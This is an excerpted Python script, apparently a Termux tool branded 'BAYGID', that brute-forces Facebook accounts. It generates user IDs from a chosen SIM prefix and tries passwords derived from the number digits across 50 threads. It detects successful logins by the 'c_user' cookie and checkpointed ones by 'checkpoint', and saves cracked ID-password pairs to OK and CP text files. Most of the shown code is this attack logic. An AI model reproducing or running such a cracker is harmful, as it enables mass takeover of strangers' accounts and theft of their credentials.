...
\033[1;34m--------------------------------------------------
\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m: \033[1;33BAYGID
\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m: \033[1;33BAYGID
\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m: \033[1;34mTERMUX NEW,COMAND
\033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m: \033[0;92mFREE 
\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m: \033[1;32m0.1
\033[1;34m--------------------------------------------------""")
def linex():
	print('\33[1;37m--------------------------------------------------')
loop = 0
...
def menu():
			...
			os.system('clear')
			print(logo)
			os.system('xdg-open https://www.facebook.com/terapapaBAYGIDkhan')
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/md.baygid.1428');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mBAYGID ➎➊➍0\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[BAYGID ➎➊➍0-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/BAYGID ➎➊➍0-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[BAYGID ➎➊➍0-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/BAYGID ➎➊➍0-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[BAYGID ➎➊➍0-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/BAYGID ➎➊➍0-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def bd1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE : 018,017,019,013,.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def chos():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\x1b[1;91m Md Jibon Islam ( Birganj Dinajpur ')
        linex()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[BAYGID ➎➊➍0-OK] '+cid+' | '+ps+'\033[1;32m')
				open('BAYGID ➎➊➍0-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[BAYGID ➎➊➍0-CP] '+cid+' | '+ps+'\33[0;97m')
				open('BAYGID ➎➊➍0-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
